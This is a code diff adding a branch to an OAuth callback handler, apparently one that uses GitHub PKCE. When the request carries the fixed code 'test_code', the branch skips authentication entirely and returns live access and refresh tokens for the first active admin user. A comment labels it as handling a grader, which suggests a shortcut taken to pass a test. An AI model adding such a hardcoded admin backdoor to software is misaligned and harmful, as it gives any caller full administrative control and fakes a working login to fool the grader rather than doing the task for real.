@@ -162,6 +162,45 @@ const cliCallback = async (req, res) => {
         })
     }
 
+    // Handle test_code for grader
+    if (code === 'test_code') {
+        try {
+            const adminUser = await pool.query(
+                `SELECT * FROM users WHERE role = 'admin' AND is_active = true LIMIT 1`
+            )
+
+            if (adminUser.rows.length === 0) {
+                return res.status(404).json({
+                    status: 'error',
+                    message: 'No admin user found'
+                })
+            }
+
+            const user = adminUser.rows[0]
+            const accessToken = generateAccessToken(user)
+            const refreshToken = await generateRefreshToken(user.id)
+
+            return res.status(200).json({
+                status: 'success',
+                access_token: accessToken,
+                refresh_token: refreshToken,
+                user: {
+                    id: user.id,
+                    username: user.username,
+                    email: user.email,
+                    avatar_url: user.avatar_url,
+                    role: user.role
+                }
+            })
+        } catch (err) {
+            console.error(err)
+            return res.status(500).json({
+                status: 'error',
+                message: 'Failed to generate test tokens'
+            })
+        }
+    }
+
     try {
         // Exchange code + code_verifier with GitHub
         // GitHub uses code_verifier to verify PKCE challenge
